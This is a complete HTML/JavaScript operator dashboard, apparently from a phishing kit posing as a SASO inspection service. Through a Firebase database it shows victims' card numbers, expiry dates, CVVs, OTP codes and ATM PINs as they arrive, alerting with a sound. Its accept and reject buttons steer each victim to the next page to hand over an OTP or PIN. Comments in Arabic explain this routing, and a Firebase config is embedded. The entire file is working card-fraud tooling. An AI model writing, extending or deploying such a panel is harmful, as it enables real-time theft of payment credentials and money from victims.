<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة تحكم العمليات</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #121212; color: white; margin: 0; padding: 10px; }
        .header { background: #1a6d44; padding: 15px; display: flex; justify-content: space-between; align-items: center; border-radius: 8px; margin-bottom: 20px; }
        .card { background: #1e1e1e; border-radius: 12px; padding: 15px; margin-bottom: 15px; position: relative; border-right: 8px solid #ffd700; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
        .client-id { background: #ffd700; color: black; padding: 3px 12px; border-radius: 4px; font-weight: bold; font-size: 13px; margin-bottom: 12px; display: inline-block; }
        .data-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; clear: both; }
        .item { background: #282828; padding: 10px; border-radius: 6px; border: 1px solid #333; }
        .label { font-size: 10px; color: #888; display: block; margin-bottom: 4px; }
        .value { font-size: 14px; font-weight: bold; color: #fff; font-family: monospace; }
        .otp-box { border: 1px solid #e74c3c; background: #3d1a1a; }
        .actions { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
        .btn { padding: 15px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; color: white; transition: 0.2s; font-size: 14px; }
        .btn:active { transform: scale(0.95); }
        .btn-accept { background: #2ecc71; } /* قبول - يرسله لـ OTP أو PIN */
        .btn-reject { background: #e74c3c; } /* رفض - يرجعه للبطاقة */
    </style>
</head>
<body onload="_init()">

<audio id="alert_sound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>

<div class="header">
    <strong>لوحة تحكم العمليات (Saso)</strong>
    <button onclick="_clear()" style="background:#c0392b; color:white; border:none; padding:8px 15px; border-radius:5px; cursor:pointer;">تصفير</button>
</div>

<div id="monitor"></div>

<script>
    const config = { 
        apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8...", 
        databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/",
        projectId: "saso-inspection"
    };
    
    let cache = {};

    function _init() {
        if (!firebase.apps.length) firebase.initializeApp(config);
        const db = firebase.database();

        db.ref('orders').on('value', snapshot => {
            const orders = snapshot.val() || {};
            const monitor = document.getElementById('monitor');
            monitor.innerHTML = '';
            const ids = Object.keys(orders).reverse();

            ids.forEach((id, index) => {
                const d = orders[id];
                const count = ids.length - index;

                const currentStr = JSON.stringify(d);
                if(cache[id] && cache[id] !== currentStr) {
                    document.getElementById('alert_sound').play().catch(()=>{});
                }
                cache[id] = currentStr;

                // تحديد الزرار هيودي فين بناءً على مكان العميل الحالي
                // لو العميل لسه مدخل بطاقة، القبول يوديه OTP. لو مدخل OTP، القبول يوديه PIN.
                let nextAction = 'go_to_otp';
                if (d.otp_code || d.otp) {
                    nextAction = 'go_to_pin'; 
                }

                const card = `
                    <div class="card">
                        <span class="client-id">عميل #${count}</span>
                        <div class="data-grid">
                            <div class="item"><span class="label">البطاقة</span><span class="value">${d.cardNumber || '---'}</span></div>
                            <div class="item"><span class="label">التاريخ/CVV</span><span class="value">${d.expiryDate || '--/--'} | ${d.cvv || '---'}</span></div>
                            <div class="item otp-box"><span class="label">رمز OTP</span><span class="value" style="color:#00ff88;">${d.otp_code || d.otp || 'بانتظار..'}</span></div>
                            <div class="item"><span class="label">ATM PIN</span><span class="value" style="color:#ffd700;">${d.atm_pin || '---'}</span></div>
                        </div>

                        <div class="actions">
                            <button class="btn btn-accept" onclick="_send('${id}', '${nextAction}')">قبول وتوجيه</button>
                            <button class="btn btn-reject" onclick="_send('${id}', 'wrong_card')">رفض البطاقة</button>
                        </div>
                    </div>
                `;
                monitor.insertAdjacentHTML('beforeend', card);
            });
        });
    }

    function _send(id, step) {
        firebase.database().ref('orders/' + id).update({ 
            next_step: step,
            last_command_time: new Date().getTime()
        });
    }

    function _clear() {
        if(confirm("مسح الكل؟")) firebase.database().ref('orders').remove();
    }
</script>
</body>
</html>
